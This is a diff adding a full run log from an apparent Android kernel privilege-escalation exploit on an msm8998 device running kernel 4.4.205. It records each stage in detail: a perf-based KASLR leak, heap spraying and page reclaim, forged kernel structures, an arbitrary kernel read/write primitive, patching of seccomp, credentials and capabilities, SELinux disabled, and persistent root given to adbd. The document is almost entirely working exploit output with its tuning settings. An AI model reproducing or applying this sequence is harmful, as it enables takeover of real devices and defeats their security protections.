@@ -1,0 +1,303 @@
+[32m[+] [0muniversal: selected table 25/26 quest1_monterey_msm8998 incremental=49845030443200410 release=4.4.205-perf+
+[32m[+] [0mstartup context pid=3748 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=3748 NoNewPrivs=? Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=3748 label=quest1_monterey_msm8998 slide=pselect main=pselect
+[33m[*] [0mstartup env IONSTACK_STALL_HOLD_MS=6000
+[33m[*] [0mstartup env IONSTACK_RECLAIM_PHYS_PFN_END=0x180000
+[33m[*] [0mstartup env IONSTACK_FOPS_LOCK_OWNER_MODE=
+[33m[*] [0mstartup env IONSTACK_SELF_ROOT=0
+[33m[*] [0mstartup env IONSTACK_XRW_KMEM=1
+[33m[*] [0mstartup env IONSTACK_PTRACE_ROUTE_ATTEMPTS=1
+[33m[*] [0mstartup env IONSTACK_PAGE_SETUP_ATTEMPTS=8
+[33m[*] [0mstartup env IONSTACK_PAYLOAD=
+[33m[*] [0mstartup env IONSTACK_MEMFD_GATE_MAX_FIRES=1
+[33m[*] [0mstartup env IONSTACK_XRW_ROOT=1
+[33m[*] [0mstartup env IONSTACK_KS_COLLISIONS=4
+[33m[*] [0mstartup env IONSTACK_XRW_HOLD=1
+[33m[*] [0mstartup env IONSTACK_ROOT_WALK_MAX=110
+[33m[*] [0mstartup env IONSTACK_PAYLOAD_TIMEOUT=120
+[33m[*] [0mstartup env IONSTACK_RECLAIM_REQUIRE_PFN_MATCH=1
+[33m[*] [0mstartup env IONSTACK_RECLAIM_PHYS_PFN_START=0x80000
+[33m[*] [0mstartup env IONSTACK_MIN_WINDOW=1
+[33m[*] [0mstartup env IONSTACK_KS_CORE=7
+[33m[*] [0mstartup env IONSTACK_KMEM_CFG_BUDGET=20000
+[33m[*] [0mstartup env IONSTACK_PIPE_ORACLE_FAST=1
+[33m[*] [0mstartup env IONSTACK_SPRAY_STALL=memfd
+[33m[*] [0mstartup env IONSTACK_TREE_ENTRY_WRITE=1
+[33m[*] [0mstartup env IONSTACK_STAGE=full
+[33m[*] [0mstartup env IONSTACK_FOPS_SAFE_TABLE=0
+[33m[*] [0mstartup env IONSTACK_RECLAIM_PERF_COUNTERS=1
+[33m[*] [0mstartup env IONSTACK_RECLAIM_PFN_IDENTITY=1
+[32m[+] [0mstartup env count=26 (only IONSTACK_* shown; absent means the built-in default applied)
+[32m[+] [0mp0 profile pid=3748 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000
+[32m[+] [0mdevice-table quest1_monterey_msm8998 incremental match=1 49845030443200410
+[32m[+] [0mdevice-table quest1_monterey_msm8998 match=1 release=4.4.205-perf+
+[32m[+] [0mstage selected=full
+[32m[+] [0mmemstart samples=36 vmemmap_base=ffffffbe48000000 memstart=-146028888064 (0xffffffde00000000) K=138 GiB dram_window=ffffffe280000000 assumed=ffffffc000000000 skew=138 GiB
+[33m[*] [0mslide perf: lowered perf_event_paranoid to 1 via security.perf_harden=0
+[33m[*] [0mslide perf perf_event_paranoid=1 (need <= 1 for kernel-mode sampling)
+[33m[*] [0mslide perf collected samples=509 spins=1825252 distinct_low=8
+[33m[*] [0mslide perf candidate[0] ip=ffffff99ec480df4 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000000df4 votes=8/8
+[33m[*] [0mslide perf candidate[1] ip=ffffff99ec480ed4 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000000ed4 votes=8/8
+[33m[*] [0mslide perf candidate[2] ip=ffffff99ec480ee4 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000000ee4 votes=8/8
+[33m[*] [0mslide perf candidate[3] ip=ffffff99ec482e3c base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000002e3c votes=8/8
+[33m[*] [0mslide perf candidate[4] ip=ffffff99ec483108 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000003108 votes=8/8
+[33m[*] [0mslide perf candidate[5] ip=ffffff99ec483354 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000003354 votes=8/8
+[33m[*] [0mslide perf candidate[6] ip=ffffff99ec483358 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000003358 votes=8/8
+[33m[*] [0mslide perf candidate[7] ip=ffffff99ec483360 base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000003360 votes=8/8
+[32m[+] [0mslide-perf-candidate ok=1 min_ip=ffffff99ec480df4 candidate_base=ffffff99ec480000 slide=00000019e4400000 skid=0000000000000df4 votes=8/8 samples=509
+[32m[+] [0mslide-kaslr-ok source=perf pid=3748 base=ffffff99ec480000 slide=00000019e4400000
+[33m[*] [0mreclaim-perf id-pin alloc=243 free=241 validated=0 (0 => falling back to the full 1..400 scan)
+[33m[*] [0mreclaim-perf id-detect candidates=4 free=219 alloc=217 free_candidates=1 alloc_candidates=1 (hardcoded defaults 205/207 are another device's, wrong here)
+[33m[*] [0mreclaim-perf setup alloc_id=217 alloc_fd=3 alloc_errno=0 free_id=219 free_fd=4 free_errno=0 order3_success_fd=5 success_errno=0 order3_fail_fd=6 fail_errno=0 free_order3_fd=7 free_order3_errno=0 frag_gfp=20072c0 extfrag_id=210 extfrag_fd=8 extfrag_errno=0
+[33m[*] [0mreclaim-pfn setup slot=0 pfn=80000 buddy=80008 alloc_fd=9 any_alloc_fd=10 free_fd=11 buddy_alloc_fd=12 buddy_free_fd=13
+[33m[*] [0mreclaim-pfn setup slot=1 pfn=c0000 buddy=c0008 alloc_fd=14 any_alloc_fd=15 free_fd=16 buddy_alloc_fd=17 buddy_free_fd=18
+[33m[*] [0mreclaim-pfn setup slot=2 pfn=100000 buddy=100008 alloc_fd=19 any_alloc_fd=20 free_fd=21 buddy_alloc_fd=22 buddy_free_fd=23
+[33m[*] [0mreclaim-pfn setup slot=3 pfn=140000 buddy=140008 alloc_fd=24 any_alloc_fd=25 free_fd=26 buddy_alloc_fd=27 buddy_free_fd=28
+[33m[*] [0mreclaim-pfn-window ranges=1 groups=4 enumerated=4 candidates=4 max=16 low=0 segment=40000 truncated=0
+[32m[+] [0mpfn-oracle target pfn=0x13e4d0 base=ffffffe33e4d0000 (memstart=-146028888064)
+[33m[*] [0mwrite-target ashmem_misc_fops=ffffff99eeafaba8 kaslr_done=1 kaslr_base=ffffff99ec480000 expect=ffffff99eeafaba8 match=1 fake_w0=ffffffe33e4d1360 w0_lock_slot=ffffffe33e4d1398
+[33m[*] [0mpayload shape mode=0 fops_pi_waiters=0 fops_pi_leftmost=1 fops_pi_node_safe=0 fops_pi_rb_shape=default fake_pi_entry=ffffffe33e4d1378 fake_parent=ffffffe33e4d0140 fake_right=ffffff99eeafaba8 binwrite=ffffffe33e4d2140 lock_owner_mode= lock_waiters=1 lock_owner_task=ffffffe33e4d2341 wait_lock_word=00000000 fops_waiter_prio_req=130 fops_waiter_prio=0 waiter_task_mode=init-task
+[33m[*] [0mpayload-verify BRANCH lock+0x00=0000000000000000 rb_root=ffffffe33e4d1360 rb_leftmost=ffffffe33e4d1360 owner=ffffffe33e4d2341 (fake_w0=ffffffe33e4d1360 fake_fops=ffffffe33e4d0140)
+[33m[*] [0mpayload-verify W0 tree{pc=0000000000000001 r=0000000000000000 l=0000000000000000} pi{pc=0000000000000000 r=0000000000000000 l=0000000000000000} task=ffffff99eea15810 lock=ffffffe33e4d0490 prio=00000000 deadline=0000000000000000 (fake_w0=ffffffe33e4d1360 fake_lock=ffffffe33e4d0490)
+[33m[*] [0mpayload-verify FOPS owner=0000000000000000 llseek=ffffffe33e4d1378 read=ffffff99ec695878 write=0000000000000000 (read==0 under SAFE_TABLE; all-zero here means this dump ran before put_fake_fops_table, not that the table is empty)
+[32m[+] [0mpfn-oracle reclaim pfn=0x13e4d0 sent=1 retaken=1
+[32m[+] [0mstage fops-page base=ffffffe33e4d0000 fake_lock=ffffffe33e4d0490 fake_w0=ffffffe33e4d1360 fake_task=ffffffe33e4d2340 fake_fops=ffffffe33e4d0140 binwrite=ffffffe33e4d2140
+[33m[*] [0mroute-mark route-enter
+[33m[*] [0mroute-mark route-threads-created
+[33m[*] [0mroute-mark route-threads-ready
+[33m[*] [0mroute-mark route-requeue-returned
+[33m[*] [0mptrace enter attempt=1 spray_off=0x48 page=ffffffe33e4d0000 fake_lock=ffffffe33e4d0490 skip_consume=0 stall=1
+[33m[*] [0mstall(memfd): ready map=0x7a053d6000 (page1 punch-racer running)
+[33m[*] [0mfops memfd-gate: watching tid=3752 (max_fires=1)
+[33m[*] [0mfops memfd-gate: D wchan="shmem_fault" -- ACCEPTED
+[33m[*] [0mfops memfd-gate: FIRE #1 sched_setattr ret=0 errno=0 nice=1 waiter_prio=130 walk=entered
+[33m[*] [0mfops memfd-gate: POST-FIRE #1 alive, walk returned
+[33m[*] [0mfops memfd-gate: GATE-EXIT fires=1 alive
+[33m[*] [0mfops memfd-gate: fires=1 dstates=1 tid=3752 samples=5383 R=5382 S=0 other=0 last=D
+[33m[*] [0mfops memfd-gate: D-state wchan filter accepted=1 rejected=0
+[33m[*] [0mfops memfd-stall: window done spray=82793 punches=102174 consumer_success=1
+[33m[*] [0mptrace spray done attempt=1 spray_calls=0 calls=1 success=1
+[33m[*] [0mroute-mark cfi-probe should_probe=1 writeonly=0 attempt=1
+[33m[*] [0mroute-mark cfi-fd-open fd=29 misc_fops=ffffff99eeafaba8
+[33m[*] [0mroute-mark decoy-pre-read target=ffffff99eea15686 want=13
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eea15686 len=13
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=13 errno=0
+[33m[*] [0mroute-mark decoy-post-read rd=13 errno=0
+[32m[+] [0mdecoy-test ret=13 errno=0 verdict=FIELDS-LAND  (reads init_uts_ns.name.release through the gadget and compares it with uname: match => buffer->page@0x10 LANDS, and so does the write gadget's destination, which is the same field)
+[33m[*] [0mroute-mark cfi-fields-land-returned
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eeafaba8 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mcfi: skipping configfs write test (no write gadget on this kernel); proceeding to physrw install
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eeafaba8 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mcfi: MIN_WINDOW -- skipping redundant kaslr re-leak (perf slide already valid), shrinking hijack exposure
+[33m[*] [0mroute-mark read-once-enter target=ffffffe33e4d0148 len=194
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=194 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eeafabb0 len=194
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=194 errno=0
+[33m[*] [0mstage restore reason=fail ok=0 ret=-1 want=ffffff99ed8da6f0 after=0000000000000000 owner=-1 refcnt=0 errno=22
+[33m[*] [0mroute-mark cfi-returned ok=0 step=8 errno=0
+[33m[*] [0mroute-mark spray-teardown-done attempt=1
+[33m[*] [0mroute-mark route-done
+[33m[*] [0mroute-mark route-returned
+[32m[+] [0mpfn-oracle(alloc order=2) pfn=0xcf450 base=ffffffe2cf450000 events=1
+[33m[*] [0mlarge-pipe try=0 resize=1048576 armed=1 base=ffffffe2cf450000
+[32m[+] [0mpfn-oracle(alloc order=2) pfn=0xd40a0 base=ffffffe2d40a0000 events=1
+[33m[*] [0mlarge-pipe try=0 resize=1048576 armed=1 base=ffffffe2d40a0000
+[33m[*] [0mxrw setup ctl_buf=ffffffe2cf450000 view_base=ffffffe2d40a0000 cap=240
+[33m[*] [0mroute-mark read-once-enter target=ffffff99ed819f48 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[32m[+] [0mxrw: fake-ops .confirm=ffffff99ec6138f8 (planting no-op release)
+[32m[+] [0mpfn-oracle target pfn=0xcf6f8 base=ffffffe2cf6f8000 (memstart=-146028888064)
+[33m[*] [0mwrite-target ashmem_misc_fops=ffffff99eeafaba8 kaslr_done=1 kaslr_base=ffffff99ec480000 expect=ffffff99eeafaba8 match=1 fake_w0=ffffffe2cf6f9360 w0_lock_slot=ffffffe2cf6f9398
+[33m[*] [0mpayload shape mode=0 fops_pi_waiters=0 fops_pi_leftmost=1 fops_pi_node_safe=0 fops_pi_rb_shape=default fake_pi_entry=ffffffe2cf6f9378 fake_parent=ffffffe2cf6f8140 fake_right=ffffff99eeafaba8 binwrite=ffffffe2cf6fa140 lock_owner_mode= lock_waiters=1 lock_owner_task=ffffffe2cf6fa341 wait_lock_word=00000000 fops_waiter_prio_req=130 fops_waiter_prio=0 waiter_task_mode=init-task
+[33m[*] [0mpayload-verify BRANCH lock+0x00=0000000000000000 rb_root=ffffffe2cf6f9360 rb_leftmost=ffffffe2cf6f9360 owner=ffffffe2cf6fa341 (fake_w0=ffffffe2cf6f9360 fake_fops=ffffffe2cf6f8140)
+[33m[*] [0mpayload-verify W0 tree{pc=0000000000000001 r=0000000000000000 l=0000000000000000} pi{pc=0000000000000000 r=0000000000000000 l=0000000000000000} task=ffffff99eea15810 lock=ffffffe2cf6f8490 prio=00000000 deadline=0000000000000000 (fake_w0=ffffffe2cf6f9360 fake_lock=ffffffe2cf6f8490)
+[33m[*] [0mpayload-verify FOPS owner=0000000000000000 llseek=ffffffe2cf6f9378 read=ffffff99ec695878 write=0000000000000000 (read==0 under SAFE_TABLE; all-zero here means this dump ran before put_fake_fops_table, not that the table is empty)
+[32m[+] [0mpfn-oracle reclaim pfn=0xcf6f8 sent=1 retaken=1
+[33m[*] [0mroute-mark xrw-fire
+[33m[*] [0mroute-mark route-enter
+[33m[*] [0mroute-mark route-threads-created
+[33m[*] [0mroute-mark route-threads-ready
+[33m[*] [0mroute-mark route-requeue-returned
+[33m[*] [0mptrace enter attempt=1 spray_off=0x48 page=ffffffe2cf6f8000 fake_lock=ffffffe2cf6f8490 skip_consume=0 stall=1
+[33m[*] [0mstall(memfd): ready map=0x7a052ed000 (page1 punch-racer running)
+[33m[*] [0mfops memfd-gate: watching tid=3758 (max_fires=1)
+[33m[*] [0mfops memfd-gate: D but wchan="0" -- not our stall, skipping (would chain-walk garbage)
+[33m[*] [0mfops memfd-gate: D but wchan="cpu_worker_pools" -- not our stall, skipping (would chain-walk garbage)
+[33m[*] [0mfops memfd-gate: D but wchan="0" -- not our stall, skipping (would chain-walk garbage)
+[33m[*] [0mfops memfd-gate: D but wchan="0" -- not our stall, skipping (would chain-walk garbage)
+[33m[*] [0mfops memfd-gate: D wchan="shmem_fault" -- ACCEPTED
+[33m[*] [0mfops memfd-gate: FIRE #1 sched_setattr ret=0 errno=0 nice=1 waiter_prio=130 walk=entered
+[33m[*] [0mfops memfd-gate: POST-FIRE #1 alive, walk returned
+[33m[*] [0mfops memfd-gate: GATE-EXIT fires=1 alive
+[33m[*] [0mfops memfd-gate: fires=1 dstates=1 tid=3758 samples=25 R=20 S=0 other=0 last=D
+[33m[*] [0mfops memfd-gate: D-state wchan filter accepted=1 rejected=4
+[33m[*] [0mfops memfd-stall: window done spray=229 punches=845 consumer_success=1
+[33m[*] [0mptrace spray done attempt=1 spray_calls=0 calls=1 success=1
+[33m[*] [0mroute-mark cfi-probe should_probe=0 writeonly=0 attempt=1
+[33m[*] [0mroute-mark spray-teardown-done attempt=1
+[33m[*] [0mroute-mark route-done
+[32m[+] [0mxrw: control installed fired=1 ctl=ffffffe2cf450000 view=ffffffe2d40a0000
+[33m[*] [0mroute-mark xrw-root-install-enter
+[33m[*] [0mboot-id physrw self-check skipped (no before-value readable)
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eec8da94 len=1
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=1 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eea15d10 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroot probe init_task.tasks.prev addr=ffffff99eea15d10 direct=0 physrw_ok=0 physrw=0000000000000000 unified_ok=1 unified=ffffffe2d0ac68b8
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac69b0 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac69b4 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6b78 len=16
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=16 errno=0
+[33m[*] [0mroot task guess task=ffffffe2d0ac63c0 pid=3778 tgid=3778 comm=ll_root_child want_tgid=3778
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6b68 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6b70 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c78 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c78 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe340f40ec4 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe340f40ec4 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c28 len=40
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=40 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c28 len=40
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=40 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c28 len=40
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=40 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c78 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac63c0 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6978 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6c08 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6c10 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac63c0 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6978 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6c08 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe2d0ac6c10 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroot seccomp patched ok=1 flags=0000000000000000/0000000000000000 atomic=0000000000000000/0000000000000000 mode=0/0 count=0/0 filter=0000000000000000/0000000000000000
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c04 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c04 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c28 len=40
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=40 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe342217c28 len=40
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=40 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe340f40ec4 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe340f40ec4 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroot cred patched uid=0/0 sid=1/1
+[33m[*] [0mroot caps patched cred eff=0000000000000000/000001ffffffffff prm=0000000000000000/000001ffffffffff amb=0000000000000000/000001ffffffffff bset=00000000000000c0/000001ffffffffff real_eff=0000000000000000/000001ffffffffff
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eec8da94 len=1
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=1 errno=0
+[33m[*] [0mroot selinux direct write ok=1 1->0
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eea51308 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eea51308 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eec8da94 len=1
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=1 errno=0
+[33m[*] [0mroot child result done=1 uid_after=0 setgid=0/0 setuid=0/0 setenforce=0/0 su=0/38 daemon=-1 selinux=1->0 cap=ffffff99eea51040/ffffff99eea51040
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eec537b0 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffff99eea1f920 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe37e238e18 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504e2330 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504e2338 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504e2308 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504bdb70 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504bdd38 len=16
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=16 errno=0
+[32m[+] [0mpid-hash resolve pid=1601 -> task=ffffffe3504bd580 tgid=1601 comm=adbd (shift=12 bucket=451, no walk)
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504bdd30 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe3504bdd28 len=8
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=8 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe36ea17784 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe36ea177a8 len=40
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=40 errno=0
+[33m[*] [0mroute-mark read-once-enter target=ffffffe36ea17784 len=4
+[33m[*] [0mroute-mark read-once-preread set_ret=0
+[33m[*] [0mroute-mark read-once-postread rd=4 errno=0
+[32m[+] [0mpersist-root adbd pid=1601 task=ffffffe3504bd580 cred=ffffffe36ea17780 real=ffffffe36ea17780 uid=2000->0 ok=1
+[33m[*] [0mkmem counters tag=root reads phys=0 cfg=47 fail=0 writes phys=10 cfg=0 fail=0 cfg_budget_left=19953 pipe_restores_ok=0 pipe_restore_fails=0 pipe_forge_abandoned=0
+[32m[+] [0mROOT VERDICT root=1 uid=2000->0 selinux_permissive=1 (1->0) persist=1(adbd)
+[32m[+] [0mxrw-root install_android_root=1 root_child_done=1 selinux=1->0
+[32m[+] [0mk r/w check ok=1 matched=1 mode=random addr=ffffff99eed7ae80 before=6858a7df-e0e9-4de2-89e1-3c069d12b6bd after=39115703-a960-4241-8c2c-2a264c8ab503
+[33m[*] [0mroute-mark xrw-root-VERDICT-ok
+[32m[+] [0mxrw: ROOT held -- box staying up, adbd is root, `adb shell` gives root. Not tearing down.
